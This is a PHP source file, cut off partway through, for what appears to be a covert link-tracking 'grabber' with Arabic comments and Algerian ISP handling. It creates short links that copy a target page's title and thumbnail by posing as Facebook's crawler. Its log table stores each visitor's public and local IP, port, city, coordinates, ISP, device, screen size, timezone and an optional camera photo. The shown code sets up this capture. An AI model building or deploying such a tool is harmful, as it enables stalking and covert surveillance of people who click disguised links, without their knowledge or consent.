<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتحقق والتأكد من العمل
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        use_camera INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        photo TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// دالة سحب العنوان وغلاف الفيديو بدقة وبدون جمل إضافية
function fetch_meta_details($url) {$title = "";
    $image = "";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
    }

    $options = [
        'http' => [
            'method' => "GET",
            'header' => "User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)\r\n"
        ]
    ];
    $context = stream_context_create($options);$html = @file_get_contents($url, false,$context);

    if ($html) {
        if (preg_match('/<meta\s+property=["\']og:title["\']\s+content=["\']([^"\']+)["\']/i', $html,$m) || preg_match('/<title>(.*?)<\/title>/i', $html,$m)) {
            $title = html_entity_decode($m[1], ENT_QUOTES, 'UTF-8');
            $title = str_replace(' - YouTube', '',$title);
        }
        if (empty($image) && preg_match('/<meta\s+property=["\']og:image["\']\s+content=["\']([^"\']+)["\']/i', $html,$m)) {
            $image =$m[1];
        }
    }

    if (empty($title)) {$parsed = parse_url($url);$title = $parsed['host'] ?? $url;
    }

    return ['title' => $title, 'image' =>$image];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'موبيليس (Mobilis)';
    if (stripos($combined,
